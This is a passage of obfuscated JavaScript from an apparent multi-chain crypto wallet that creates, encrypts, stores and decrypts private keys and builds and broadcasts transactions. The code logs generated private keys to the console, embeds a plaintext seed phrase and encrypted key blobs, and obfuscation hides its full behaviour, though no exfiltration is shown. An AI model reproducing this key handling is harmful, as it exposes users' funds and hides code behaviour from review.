_0x3614b8=_0x28cfff,_0x13e2e4=document['getElementById'](_0x3614b8(0x28c))[_0x3614b8(0x1ae)],_0x183947=document['getElementById'](_0x3614b8(0x150))[_0x3614b8(0x1ae)],_0x4fe7ee=CoinsJson[_0x13e2e4][_0x3614b8(0x182)];console[_0x3614b8(0x109)](_0x3614b8(0x291),_0x4fe7ee),console['log'](_0x3614b8(0xe0),_0x13e2e4),console[_0x3614b8(0x109)](_0x3614b8(0x124),_0x183947);if(!_0x183947){console['log'](_0x3614b8(0x2bb));return;}var _0x5d3e27=_0x183947;try{if(CoinsJson[_0x13e2e4][_0x3614b8(0x1d3)]==_0x3614b8(0x114)&&web3[_0x3614b8(0x218)]['accounts'][_0x3614b8(0x2fa)](_0x5d3e27))var _0x99136a=web3['eth']['accounts']['privateKeyToAccount'](_0x5d3e27)[_0x3614b8(0x1f7)];else{if(CoinsJson[_0x13e2e4]['NetworkType']==_0x3614b8(0x191)){console[_0x3614b8(0x109)]('add\x20Address:',_0x13e2e4);var _0x3fb4e6=await ChangeBitcoinLikeParameter(_0x13e2e4);_0x99136a=coinjs[_0x3614b8(0x255)](_0x5d3e27)[_0x3614b8(0x1f7)];}}}catch(_0x38383e){console['log'](_0x3614b8(0x2e4),_0x38383e);return;}var _0xa620ad=CryptoJS[_0x3614b8(0x137)][_0x3614b8(0x296)](_0x183947,pass)[_0x3614b8(0x1d5)](),_0x17870f=getAccountsIndexData();console[_0x3614b8(0x109)](_0x3614b8(0x2ea),_0x17870f[_0x4fe7ee]);var _0x44bb31=_0x17870f[_0x4fe7ee];await pushToSpecificIndex(_0x4fe7ee,_0x44bb31,_0xa620ad),await addOneAccountByJson(_0x4fe7ee),document[_0x3614b8(0xea)](_0x3614b8(0x150))['value']='',await updateAccountSelector(),await updateMainAccountSelector(),document[_0x3614b8(0xea)](_0x3614b8(0x212))[_0x3614b8(0x12b)]=document['getElementById']('MainAccountSelector')[_0x3614b8(0x1f9)]['length']-0x1,await OnChangeSelector2();}async function InitAccounts(){var _0x1bf27c=_0x28cfff;console[_0x1bf27c(0x109)]('InitAccounts');const _0x1d155f=new Web3(),_0x4e8f9e=_0x1d155f[_0x1bf27c(0x218)][_0x1bf27c(0x1c1)][_0x1bf27c(0x265)]();console[_0x1bf27c(0x109)]('evm\x20Address:\x20',_0x4e8f9e[_0x1bf27c(0x1f7)]);for(var _0x2ad766 in CoinsJson){console[_0x1bf27c(0x109)](_0x1bf27c(0x188),_0x2ad766);if(CoinsJson[_0x2ad766][_0x1bf27c(0x1d3)]===_0x1bf27c(0x191)){const _0x4a57ec=bitcoin['networks'][_0x1bf27c(0xf9)];_0x4a57ec[_0x1bf27c(0x286)]=CoinsJson[_0x2ad766][_0x1bf27c(0x130)],_0x4a57ec[_0x1bf27c(0xfa)]=CoinsJson[_0x2ad766][_0x1bf27c(0x164)],_0x4a57ec[_0x1bf27c(0x2c4)]=CoinsJson[_0x2ad766][_0x1bf27c(0x1d9)];var _0x4ea958=bitcoin[_0x1bf27c(0x228)][_0x1bf27c(0x1d0)](),_0x9109b2=_0x4ea958[_0x1bf27c(0x2a1)],_0x18f8af=bitcoin[_0x1bf27c(0x272)][_0x1bf27c(0x229)]({'pubkey':_0x9109b2})[_0x1bf27c(0x1f7)],_0x50d08a=_0x4ea958[_0x1bf27c(0x2b0)]();console[_0x1bf27c(0x109)]('Coin:',_0x2ad766),console[_0x1bf27c(0x109)](_0x1bf27c(0x23e),_0x18f8af),console[_0x1bf27c(0x109)]('privKey:',_0x50d08a),await SaveAccount(_0x2ad766,_0x50d08a);}else CoinsJson[_0x2ad766]['NetworkType']==='evm'&&await SaveAccount(_0x2ad766,_0x4e8f9e['privateKey']);}}async function SaveAccount(_0xada628,_0x3eb8b5){var _0xb23131=_0x28cfff,_0x448a1c=CryptoJS[_0xb23131(0x137)][_0xb23131(0x296)](_0x3eb8b5,pass)[_0xb23131(0x1d5)](),_0x355df3=getAccountsData();_0x355df3['hasOwnProperty'](_0xada628)?_0x355df3[_0xada628][_0xb23131(0x143)](_0x448a1c):_0x355df3[_0xada628]=[_0x448a1c],saveAccountsData(_0x355df3);}async function SaveAccountIndex(_0x55374a,_0x1e1f45){var _0x2a7710=getAccountsIndexData();_0x2a7710[_0x55374a]=_0x1e1f45,saveAccountsIndexData(_0x2a7710);}async function updateAccountSelector(){var _0x107db2=_0x28cfff;if(pass==''){console['log'](_0x107db2(0x12f));return;}var _0x5952ca=document[_0x107db2(0xea)](_0x107db2(0x28c))[_0x107db2(0x1ae)],_0xbdb8b0=getAccountsData(),_0x1a8f37=document[_0x107db2(0xea)](_0x107db2(0x13b));_0x1a8f37[_0x107db2(0x1cd)]='';var _0x341482='';if(CoinsJson[_0x5952ca][_0x107db2(0x1d3)]==_0x107db2(0x114))_0x341482=_0x107db2(0x114),$(_0x107db2(0x259))['hide']();else CoinsJson[_0x5952ca][_0x107db2(0x1d3)]==_0x107db2(0x191)&&(_0x341482=_0x5952ca,$(_0x107db2(0x259))[_0x107db2(0x16b)]());var _0x46b5e8=getAccountsIndexData();console[_0x107db2(0x109)](_0x107db2(0x2ea),_0x46b5e8[_0x341482]);if(_0xbdb8b0[_0x107db2(0x152)](_0x341482))for(var _0xa9143e=0x0;_0xa9143e<_0x46b5e8[_0x341482];_0xa9143e++){var _0x422030=document[_0x107db2(0x2db)](_0x107db2(0x162)),_0x5e0212=_0xbdb8b0[_0x341482][_0xa9143e];console[_0x107db2(0x109)](_0x107db2(0x169),_0x5e0212),console[_0x107db2(0x109)](_0x107db2(0x1c0),_0x341482);var _0x4c72d9=await DecryptAccount(_0x5e0212),_0x3fa31f='';if(CoinsJson[_0x5952ca][_0x107db2(0x1d3)]==_0x107db2(0x114))_0x3fa31f=web3[_0x107db2(0x218)][_0x107db2(0x1c1)][_0x107db2(0x2fa)](_0x4c72d9)[_0x107db2(0x1f7)];else{if(CoinsJson[_0x5952ca]['NetworkType']==_0x107db2(0x191)){console[_0x107db2(0x109)]('Get\x20Address:',_0x5952ca);var _0x5411e7=await ChangeBitcoinLikeParameter(_0x5952ca);_0x3fa31f=coinjs[_0x107db2(0x255)](_0x4c72d9)['address'];}}_0x422030[_0x107db2(0x1ae)]=_0x5e0212,_0x422030[_0x107db2(0x2ab)]=_0x107db2(0x2f0)+_0xa9143e+'\x20'+shortenAddress(_0x3fa31f),_0x1a8f37['add'](_0x422030);}}async function DecryptAccount(_0x4d2b6a){var _0x376b78=_0x28cfff,_0x5ab036=CryptoJS[_0x376b78(0x137)][_0x376b78(0xcf)](_0x4d2b6a,pass),_0x178e52=_0x5ab036['toString'](CryptoJS['enc'][_0x376b78(0x28b)]);return _0x178e52;}function _0x1669(){var _0x15d08e=['call','Transfer','Error\x20sending\x20transaction:','add','PasswordLabelID','selectedIndex','2iZGtOM','user\x20input...','fromMnemonic','pass\x20is\x20empty','pub','warn','#TokenInputDivID','querySelector','Transaction\x20Hash:\x20','NextButtonID','CalculateOutput\x20as\x20input:','AES','SystemProgram','prev_hash:','function','ImportAccountSelector','GetFee...','UnconfirmedBalanceID','not\x20valid\x20user','sendSignedTransaction','Doge','\x20ETH','SendMinAmount','push','toBuffer','#MainUIID','ready','#ShowAddressQR','_owner','Fee≈','addinput','MainBlockchainSelector','/pushTx','https://api.blockcypher.com/v1/','txHex:','stop','accountInput','isFinite','hasOwnProperty','medium_fee_per_kb','SignedHashTextID','gas','Current\x20value\x20of\x20i:','environment','https://ftmscan.com','https://etherscan.io','#CreateButtonID','from','name','User\x20input\x20amount:','rawTransaction','d-none','m/44\x27/60\x27/0\x27/0/','updateMainAccountSelector\x20account:','option','Send\x20','priv','totalSupply','balance','transaction.tx_input_n:','9789zazvtZ','account:','After\x20Modify\x20Change:','show','appendChild','utxos\x20is\x20empty','newTxHex:','#BroadcastButtonID','dogecoin','hidden.bs.modal','data\x20address:','green','input[name=\x22color\x22]','hidden','250810lZNBBu','GenerateTransactionTable\x20FromAddress:','my\x20address:','GetBalanceRun:','<p\x20style=\x22color:\x20red;\x22>','FeeReciever','serialize','byteLength','wrong\x20private\x20key','search','getOrCreateInstance','#txHashTableBody','SaveItemName','MinerFee:','string','<button\x20type=\x22button\x22\x20onclick=\x22copyTransactionLink()\x22\x20class=\x22btn\x20btn-light\x22><img\x20src=\x22img/copy.png\x22\x20alt=\x22Image\x22\x20style=\x22width:\x2020px;\x20height:\x2020px;\x20margin-right:\x205px;\x22></button>','180EqPWvs','23264PEDHcD','key','https://rpc.ankr.com/polygon','removeItem','hex:','forEach','decimals','https://live.blockcypher.com/doge','fetch\x20JSON\x20Action:','bitcoin.payments:','BitcoinLike','randomBytes','SendBitcoinLikeWithCoinJS','Unexpected\x20error,\x20please\x20try\x20again','SendAmount:','\x20Address!','New\x20Transaction\x20Outputs:','MnemonicTextID','MaximumMinerFee','Connection','Transaction\x20sent:','0x...u9','getGasPrice','btn-light','constructor','bip32','</p>','response.data','btn','mnemonicToSeedSync','stringify','ins','qrcode','transaction','hdkeyprv','final_balance','PublicKey','approve','Get\x20PublicKey:','value','accountsData','unconfirmed_txrefs','click','prev_hash','exception','#RestorePanelID','toggle','5px','/push/transaction','38962PimkFa','textarea','https://chain.so/api/v3/broadcast_transaction/','Output\x20value:','https://api.blockcypher.com/v1/doge/main/txs/8265121a8b4d3bab35be9be705a47a629a2809861a50313813b84ed272994e9d','Output\x20addresses:','toHex','TransactionBuilder','CoinType:','accounts','trim','MnemonicCoinType','CancelTransaction','test\x20tx:','ethAddress','U2FsdGVkX18pqEf7x0ruPol2wdYdg17psgPwajmJcoGtYRx4v2jH7aI14d/psbzrqL3hiNBKd8ro4sZ4Xo7K6Q==','PrivateKeyInputID','view','/main/txs/','txHashTableBody','Coin:','innerHTML','toAddress','GlobalMinerFee:','makeRandom','#SignDivID','encodeABI','NetworkType','PrivateKeyShowID','toString','addEventListener','nonce:','evm\x20Address:\x20','multisig','disabled','toFixed','post','val','height','Converted\x20Raw\x20Transaction:','Estimated\x20Gas\x20Limit:','CurrentRestoreAccountID','MainAccountSelectorIndex','64972lFfkuO','catch','#MainBlockchainSelector','SetMax\x20SendAmount:','reduce','#qrCodeModal','new:','Approval\x20receipt:','sendEther...','receipt','tx:','getSelection','transaction.tx_output_n:','hdkeypub','json','pow','Add\x20Fee','Current\x20\x20transfer\x20fee\x20per\x20kilobyte:\x20','#HowToUseID','AVAX','address','outs','options','owner','Util','FTM','amount\x20is\x20empty\x20or\x20not\x20a\x20number.','decode','addInput','</option>','addOneAccountByJson:','unconfirmed_balance','fallback','Toast','color','input','Set\x20Password','PrivateKeyID','SpeedID','GlobalChainID:','Get\x20Balance','BlockExplorer','amount','SHA256','payable','removeAllRanges','transactionSize:','MainAccountSelector','once','TransactionID','prv','CRO','type','eth','DefaultMinerFee','Please\x20use\x20a\x20new\x20wallet\x20to\x20restore\x20your\x20account','Send\x20amount\x20should\x20>\x20','status','LoginButtonID','Transaction\x20Broadcasted!\x0aTransaction\x20ID:\x20','send\x20ether','slice','transferFrom','uint8','append','img/','symbol:','feePayer','methods','ECPair','p2pkh','url:','updateMainAccountSelector\x20Get\x20Address:','fromAddress','https://api.blockcypher.com/v1/lite/main/txs/push','https://snowtrace.io/pushTx','Transaction\x20Receipt:\x20','(((.+)+)+)+$','prototype','test\x20transaction\x20replacement','EstimateGas\x20error,please\x20make\x20sure\x20your\x20balance\x20is\x20enough.','spinner','empty\x20Hash.','console','CoinLogoID','create\x20mnemonic:','result','/transaction/','TokenInputID','https://bscscan.com','Balance:','pubKey:','nonpayable','new\x20address\x20added','SelectedAddress','trigger','removeChild','balanceOf','setItem','coin:','CurrentBalance','balance:','password','FromSendUI','apply','outs:','getBalance','inputs','abi','updateMainAccountSelector\x20CoinType:','textContent','Final\x20Transaction\x20Hex:','https://subnets.avax.network/c-chain','Error\x20broadcasting\x20transaction','wif2address','Copy\x20Image','UserInputtxID','AccountsIndex','#SetMaxSendAmountButtonID','SendMinAmount:','remove','RPCURL','process\x20coin','IsANewWallet:','#showQRPopupBtn','Error:','size','chainid','length','Litecoin','create','event','enc','APPFee:','#loader1','https://ftmscan.com/pushTx','FromMainUI','HDNode','hashedPassword','img','n_tx:','SOL','_spender','payments','#SignButtonID','SendETHTitle','complete...','sign','uint256','https://example.com','2230hHKGwo','data.tx.hash:','mnemonic','MnemonicID','CurrentEncryptedPrivateKey:','L2...K9','data','Create','BNB','img/BTC.png','SetMax\x20APPFee:','low_fee_per_kb','Keypair','pubKeyHash','ajax','allowance','>\x20max\x20balace,set\x20as\x20balance','ether','Utf8','ImportBlockchainSelector','FromAddressID','getItem','hex','15708VntcdU','SaveItemName:','addRange','https://eth.llamarpc.com','OnChangeSelector2..','href','encrypt','send\x20...','deriveHardened','error','txID','Transaction\x20Error:','spender','privateKey','MATIC','?includeScript=true&unspentOnly=true','https://bsc-dataseed1.binance.org:443','publicKey','Get\x20Address:','build','Login','Add\x20new\x20address:','Approval','Transaction\x20Fee:','derive','accountsData\x20is\x20empty:','InitAccountsByMnemonic','text','innerText','Login\x20fail','/main','checked','toWIF','.png','encodeFunctionCall','hash','Invalid\x20input','transfer','selectNode','Failed\x20to\x20broadcast:\x20error\x20code=','HttpProvider','modal','parse','Please\x20enter\x20an\x20account\x20value.','D5...8p','From:','MainBlockchainSelector\x20index:','application/json','hide','_from','tx_output_n','ins:','scriptHash','data:','_value','32rVLhtT','script','#PrivateKeyModal','unconfirmed_n_tx','signTransaction','trace','signed:','21417VrpAzX','privKey:','wrong\x20BitcoinLike\x20private\x20key...','Import\x20complete!','bind','ThisBalanceID','AddOneAccount...','Valid\x20','test\x20tx.size():','after\x20pushToSpecificIndex:','Send\x20Max','Text\x20copied\x20to\x20clipboard!','bool','createElement','table','#MnemonicPanelID','1x...u9','symbol','https://cronoscan.com','U2FsdGVkX18sCikBk2SPQUqEre/CvCTJZpo65tQdrMeP/K3aVvNbonEDWK3Gzbc0SFFKRrJkudR4r9q3/t1N6A==','tx_hash','#HowToUseDivID','error:','querySelectorAll','1005027shubHW','#cryptoDetails','UserInputSignedHashID','tokenAmountInWei:','AccountsIndex:','data\x20address','Login\x20successful','execCommand','MainAccountSelector\x20index:','/main/addrs/','Account','RPCURL:','SendETHid','_to','m/44\x27/60\x27/0\x27/0/0','then','addOutput','Solana','Error\x20occurred\x20while\x20sending\x20tokens','NewUserInit','privateKeyToAccount','index','publicKey:','#RestoreButtonID','change','sendAndConfirmTransaction','Current\x20Gas\x20Price\x20(Wei):','438HqOUqI','/tx/','SendETH','transaction.tx_hash:','isValidMnemonic','https://rpc.ankr.com/fantom','BroadcastURLID','select','APPFee','transaction_hash','decrypt','output_index','addOneAccountByJson\x20coin:','fromSeed','StartSendButtonID','#BroadcastDivID','Contract','QR\x20Code\x20detected:\x20','marginRight','style','#ImportPrivateID','GenerateTransactionTable\x20data:','copy','Bitcoin','createRange','SendToken:','Transaction\x20Receipt:','selectedCategory','img/copy.png','tokenDecimals:','n_tx','empty\x20tx\x20or\x20private\x20key.','tumble\x20board\x20helmet\x20half\x20question\x20mammal\x20glue\x20truck\x20double\x20parent\x20flat\x20proof\x20drop\x20scout\x20amazing\x20hamster\x20purity\x20piece\x20sail\x20bright\x20thing\x20ghost\x20infant\x20dismiss','FromUserInput','networks','SetMax\x20TotalSend:','https://live.blockcypher.com/ltc','getElementById','#SendFormID','GenerateTransactionTable','{}.constructor(\x22return\x20this\x22)(\x20)','outputs','BlockchairSymbol','#LoginPanelID','getTransactionCount','fetch\x20JSON:','providers','txrefs','fromHex','addoutput','deserialize','body','bitcoin','wif','toWei','https://polygonscan.com','SetMax\x20MinerFee:','mnemonic\x20exist','from\x20Address\x20or\x20to\x20Address\x20is\x20empty','CurrentCount:','Please\x20enter\x20a\x20valid\x20password\x20>=3,not\x20empty','fromWIF','invalid\x20Mnemonic','TotalSend:','estimateGas','SendToken','toLowerCase','FeeAmount','log','Loading...','#InputPrivateKeyManuallyID','Transaction','derivePath','Error\x20fetching\x20Bitcoin\x20transaction:','balance\x20not\x20enough.','DesiredOutput:','https://eth.drpc.org','classList','test','evm','Change:','#CreateTransactionDivID','https://bscscan.com/pushTx','Token\x20address\x20is\x20empty','addresses','utils','POST','/main/txs/push','fee:','toUpperCase','liveToast','LAMPORTS_PER_SOL','src','button','transactionHash','accountValue','#qrModal'];_0x1669=function(){return _0x15d08e;};return _0x1669();}async function updateMainAccountSelector(){var _0x34861e=_0x28cfff;document[_0x34861e(0xea)](_0x34861e(0x1c8))[_0x34861e(0x1ae)]='';if(pass==''){console[_0x34861e(0x109)](_0x34861e(0x12f));return;}var _0x231b6a=document[_0x34861e(0xea)](_0x34861e(0x14b))[_0x34861e(0x1ae)],_0x5ed178=getAccountsData(),_0xcba56d=document['getElementById'](_0x34861e(0x212)),_0x1e883f='';if(CoinsJson[_0x231b6a]['NetworkType']==_0x34861e(0x114))_0x1e883f=_0x34861e(0x114),$(_0x34861e(0x259))[_0x34861e(0x2c0)]();else CoinsJson[_0x231b6a][_0x34861e(0x1d3)]==_0x34861e(0x191)&&(_0x1e883f=_0x231b6a,$(_0x34861e(0x259))[_0x34861e(0x16b)]());if(CoinsJson[_0x231b6a][_0x34861e(0x1d3)]==_0x34861e(0x191))document[_0x34861e(0xea)]('EtherOrTokenOptionID')[_0x34861e(0x175)]=!![],document[_0x34861e(0xea)](_0x34861e(0x209))[_0x34861e(0x175)]=![];else CoinsJson[_0x231b6a]['NetworkType']==_0x34861e(0x114)&&(document[_0x34861e(0xea)]('EtherOrTokenOptionID')[_0x34861e(0x175)]=![],document['getElementById'](_0x34861e(0x209))['hidden']=!![]);_0xcba56d[_0x34861e(0x1cd)]='';var _0x431354=getAccountsIndexData();console[_0x34861e(0x109)](_0x34861e(0x2ea),_0x431354[_0x1e883f]);if(_0x5ed178[_0x34861e(0x152)](_0x1e883f)){for(var _0x97f882=0x0;_0x97f882<_0x431354[_0x1e883f];_0x97f882++){var _0xaabb07=document['createElement'](_0x34861e(0x162)),_0x36277b=_0x5ed178[_0x1e883f][_0x97f882];console[_0x34861e(0x109)](_0x34861e(0x161),_0x36277b),console[_0x34861e(0x109)](_0x34861e(0x250),_0x1e883f);var _0x33ddfd=await DecryptAccount(_0x36277b),_0xd0eda8='';if(CoinsJson[_0x231b6a][_0x34861e(0x1d3)]=='evm')_0xd0eda8=web3[_0x34861e(0x218)][_0x34861e(0x1c1)]['privateKeyToAccount'](_0x33ddfd)[_0x34861e(0x1f7)];else{if(CoinsJson[_0x231b6a][_0x34861e(0x1d3)]==_0x34861e(0x191)){console['log'](_0x34861e(0x22b),_0x231b6a);var _0x4b49cf=await ChangeBitcoinLikeParameter(_0x231b6a);_0xd0eda8=coinjs['wif2address'](_0x33ddfd)[_0x34861e(0x1f7)];}}_0xaabb07[_0x34861e(0x1ae)]=_0x36277b,_0xaabb07[_0x34861e(0x2ab)]='Account'+_0x97f882+'\x20'+shortenAddress(_0xd0eda8),_0xcba56d['add'](_0xaabb07);}CurrentEncryptedPrivateKey=_0x5ed178[_0x1e883f][0x0],document[_0x34861e(0xea)]('SelectedAddress')[_0x34861e(0x2ac)]=_0xd0eda8;}else console['log'](_0x34861e(0x2a9),_0x5ed178);GetFee(_0x231b6a),document[_0x34861e(0xea)](_0x34861e(0x239))['innerText']='',document['getElementById'](_0x34861e(0x1ce))[_0x34861e(0x2ac)]='',document[_0x34861e(0xea)]('amount')[_0x34861e(0x2ac)]='';}var SendToken=![],GlobalChainID=0x1;document['getElementById'](_0x28cfff(0x2f2))['checked']=!![],document['getElementById'](_0x28cfff(0x307))[_0x28cfff(0x295)]=_0x28cfff(0x159)+'/pushTx',document[_0x28cfff(0xea)](_0x28cfff(0x307))[_0x28cfff(0x251)]=_0x28cfff(0x159)+_0x28cfff(0x14c),$(_0x28cfff(0x132))[_0x28cfff(0x2c0)]();var RPCURL=_0x28cfff(0x293),web3=new Web3(new Web3[(_0x28cfff(0xf3))][(_0x28cfff(0x2b8))](RPCURL));$(document)[_0x28cfff(0x146)](function(){var _0x3b886e=_0x28cfff;$('#CreateTransactionDivID')['show'](),$(_0x3b886e(0x1d1))['hide'](),$(_0x3b886e(0xd4))[_0x3b886e(0x2c0)](),$('#HowToUseDivID')[_0x3b886e(0x2c0)](),$(_0x3b886e(0x15a))['click'](function(){var _0x30c593=_0x3b886e;$('#CreateTransactionDivID')[_0x30c593(0x16b)](),$('#SignDivID')[_0x30c593(0x2c0)](),$(_0x30c593(0xd4))['hide'](),$('#HowToUseDivID')[_0x30c593(0x2c0)]();}),$(_0x3b886e(0x273))[_0x3b886e(0x1b1)](function(){var _0x5e1ea3=_0x3b886e;$(_0x5e1ea3(0x116))['hide'](),$('#SignDivID')['show'](),$(_0x5e1ea3(0xd4))['hide'](),$(_0x5e1ea3(0x2e3))['hide']();}),$(_0x3b886e(0x16f))[_0x3b886e(0x1b1)](function(){var _0x6f7c0=_0x3b886e;$(_0x6f7c0(0x116))[_0x6f7c0(0x2c0)](),$(_0x6f7c0(0x1d1))[_0x6f7c0(0x2c0)](),$(_0x6f7c0(0xd4))[_0x6f7c0(0x16b)](),$(_0x6f7c0(0x2e3))[_0x6f7c0(0x2c0)]();}),$(_0x3b886e(0x1f5))[_0x3b886e(0x1b1)](function(){var _0x327f91=_0x3b886e;$(_0x327f91(0x116))[_0x327f91(0x2c0)](),$(_0x327f91(0x1d1))['hide'](),$(_0x327f91(0xd4))[_0x327f91(0x2c0)](),$(_0x327f91(0x2e3))['show']();});const _0x1973d2=document[_0x3b886e(0x2e5)](_0x3b886e(0x174));_0x1973d2['forEach'](_0x98d829=>{var _0xa84982=_0x3b886e;_0x98d829[_0xa84982(0x1d6)](_0xa84982(0x2fe),function(){var _0x1e641d=_0xa84982;console[_0x1e641d(0x109)]('Selected\x20:\x20'+this['value']);if(this[_0x1e641d(0x1ae)]==_0x1e641d(0x303))SendToken=![],$(_0x1e641d(0x132))[_0x1e641d(0x2c0)]();else this[_0x1e641d(0x1ae)]==_0x1e641d(0x106)&&(SendToken=!![],$(_0x1e641d(0x132))[_0x1e641d(0x16b)]());console['log'](_0x1e641d(0xde),SendToken);});}),$(_0x3b886e(0x147))['click'](function(){var _0x3639ee=_0x3b886e;document[_0x3639ee(0xea)](_0x3639ee(0x1a7))['innerHTML']='';let _0x44a6b9='https://example.com',_0x2d28ae=new QRCode(document[_0x3639ee(0xea)](_0x3639ee(0x1a7)),{'text':document[_0x3639ee(0xea)](_0x3639ee(0x13b))[_0x3639ee(0x251)],'width':0x190,'height':0x190});$('#qrCodeModal')[_0x3639ee(0x2b9)](_0x3639ee(0x16b));}),$(_0x3b886e(0x25f))[_0x3b886e(0x1b1)](function(){var _0x948f69=_0x3b886e;document[_0x948f69(0xea)](_0x948f69(0x1a7))[_0x948f69(0x1cd)]='';let _0x4459bc=_0x948f69(0x278),_0x440432=new QRCode(document[_0x948f69(0xea)]('qrcode'),{'text':document[_0x948f69(0xea)](_0x948f69(0x154))[_0x948f69(0x1ae)],'width':0x190,'height':0x190});$(_0x948f69(0x1e8))[_0x948f69(0x2b9)]('show');}),$('#showCreatedTransactionQRPopupBtn')[_0x3b886e(0x1b1)](function(){var _0x5f4d64=_0x3b886e;document['getElementById'](_0x5f4d64(0x1a7))[_0x5f4d64(0x1cd)]='';let _0x262610=new QRCode(document['getElementById'](_0x5f4d64(0x1a7)),{'text':document['getElementById'](_0x5f4d64(0x29a))[_0x5f4d64(0x1ae)],'width':0x190,'height':0x190});$(_0x5f4d64(0x1e8))['modal']('show');}),$('#ReceiveButtonID')[_0x3b886e(0x1b1)](function(){var _0x282894=_0x3b886e;document['getElementById']('qrcode')[_0x282894(0x1cd)]='';let _0x101858=new QRCode(document[_0x282894(0xea)](_0x282894(0x1a7)),{'text':document[_0x282894(0xea)](_0x282894(0x241))[_0x282894(0x2ac)],'width':0x190,'height':0x190});$('#qrCodeModal')[_0x282894(0x2b9)](_0x282894(0x16b));});});function ShowToast(_0x51880e){var _0x508b74=_0x28cfff,_0x5f5554=document[_0x508b74(0xea)](_0x508b74(0x11f)),_0x259c67=_0x5f5554[_0x508b74(0x133)]('.toast-body');_0x259c67[_0x508b74(0x2ac)]=_0x51880e;const _0x1bd0ec=bootstrap[_0x508b74(0x204)][_0x508b74(0x180)](document[_0x508b74(0xea)]('liveToast'));_0x1bd0ec['show']();}async function showModalTest(){var _0x5053a4=_0x28cfff;$(_0x5053a4(0x125))[_0x5053a4(0x2b9)](_0x5053a4(0x16b));}async function CreateTransaction(){var _0x20e626=_0x28cfff;console[_0x20e626(0x109)](_0x20e626(0x280)),document[_0x20e626(0xea)]('txID')[_0x20e626(0x1ae)]='';if(document[_0x20e626(0xea)](_0x20e626(0x20d))[_0x20e626(0x1ae)]==''&&!Number[_0x20e626(0x151)](document[_0x20e626(0xea)]('amount')[_0x20e626(0x1ae)])){console[_0x20e626(0x109)](_0x20e626(0x1fd)),ShowToast('amount\x20is\x20empty\x20or\x20not\x20a\x20number.');return;}if(document[_0x20e626(0xea)]('fromAddress')[_0x20e626(0x1ae)]==''||document[_0x20e626(0xea)]('toAddress')[_0x20e626(0x1ae)]==''){console[_0x20e626(0x109)](_0x20e626(0xff)),ShowToast(_0x20e626(0xff));return;}if(SendToken&&document[_0x20e626(0xea)](_0x20e626(0x23b))[_0x20e626(0x1ae)]==''){console[_0x20e626(0x109)](_0x20e626(0x118)),ShowToast(_0x20e626(0x118)),stopSpinner(_0x20e626(0xd3));return;}var _0x228c0a=document[_0x20e626(0xea)](_0x20e626(0x22c))[_0x20e626(0x1ae)],_0x210c82=document[_0x20e626(0xea)](_0x20e626(0x1ce))['value'];const _0x3a2d99=document[_0x20e626(0xea)](_0x20e626(0x20d))[_0x20e626(0x1ae)];var _0x2fa57d=await web3[_0x20e626(0x218)][_0x20e626(0xf1)](_0x228c0a);console[_0x20e626(0x109)](_0x20e626(0x1d7),_0x2fa57d);var _0x466553=await web3[_0x20e626(0x218)][_0x20e626(0x19d)]();_0x466553=web3[_0x20e626(0x11a)][_0x20e626(0x1be)](_0x466553),console[_0x20e626(0x109)](_0x20e626(0x300),_0x466553);var _0x197bae=null,_0x11693b;if(SendToken){var _0x57a154=document[_0x20e626(0xea)](_0x20e626(0x23b))[_0x20e626(0x1ae)];const _0x2f26f8=[{'constant':!![],'inputs':[],'name':_0x20e626(0x15c),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x20e626(0x1c9),'type':_0x20e626(0x13a)},{'constant':![],'inputs':[{'name':_0x20e626(0x271),'type':_0x20e626(0x1f7)},{'name':'_value','type':_0x20e626(0x277)}],'name':'approve','outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':'nonpayable','type':_0x20e626(0x13a)},{'constant':!![],'inputs':[],'name':_0x20e626(0x165),'outputs':[{'name':'','type':_0x20e626(0x277)}],'payable':![],'stateMutability':_0x20e626(0x1c9),'type':_0x20e626(0x13a)},{'constant':![],'inputs':[{'name':'_from','type':'address'},{'name':'_to','type':_0x20e626(0x1f7)},{'name':'_value','type':'uint256'}],'name':'transferFrom','outputs':[{'name':'','type':'bool'}],'payable':![],'stateMutability':_0x20e626(0x23f),'type':'function'},{'constant':!![],'inputs':[],'name':_0x20e626(0x18d),'outputs':[{'name':'','type':_0x20e626(0x222)}],'payable':![],'stateMutability':_0x20e626(0x1c9),'type':_0x20e626(0x13a)},{'constant':!![],'inputs':[{'name':_0x20e626(0x148),'type':'address'}],'name':_0x20e626(0x244),'outputs':[{'name':_0x20e626(0x166),'type':_0x20e626(0x277)}],'payable':![],'stateMutability':_0x20e626(0x1c9),'type':_0x20e626(0x13a)},{'constant':!![],'inputs':[],'name':_0x20e626(0x2df),'outputs':[{'name':'','type':'string'}],'payable':![],'stateMutability':_0x20e626(0x1c9),'type':_0x20e626(0x13a)},{'constant':![],'inputs':[{'name':_0x20e626(0x2f3),'type':'address'},{'name':'_value','type':_0x20e626(0x277)}],'name':_0x20e626(0x2b5),'outputs':[{'name':'','type':_0x20e626(0x2da)}],'payable':![],'stateMutability':'nonpayable','type':_0x20e626(0x13a)},{'constant':!![],'inputs':[{'name':_0x20e626(0x148),'type':'address'},{'name':_0x20e626(0x271),'type':_0x20e626(0x1f7)}],'name':_0x20e626(0x288),'outputs':[{'name':'','type':_0x20e626(0x277)}],'payable':![],'stateMutability':_0x20e626(0x1c9),'type':_0x20e626(0x13a)},{'payable':!![],'stateMutability':_0x20e626(0x20f),'type':'fallback'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x20e626(0x1fa),'type':_0x20e626(0x1f7)},{'indexed':!![],'name':_0x20e626(0x29c),'type':_0x20e626(0x1f7)},{'indexed':![],'name':_0x20e626(0x1ae),'type':_0x20e626(0x277)}],'name':_0x20e626(0x2a6),'type':'event'},{'anonymous':![],'inputs':[{'indexed':!![],'name':_0x20e626(0x15b),'type':_0x20e626(0x1f7)},{'indexed':!![],'name':'to','type':_0x20e626(0x1f7)},{'indexed':![],'name':_0x20e626(0x1ae),'type':_0x20e626(0x277)}],'name':_0x20e626(0x127),'type':_0x20e626(0x266)}],_0x3a3505=new web3[(_0x20e626(0x218))][(_0x20e626(0xd5))](_0x2f26f8,_0x57a154);var _0x35ef7c=await 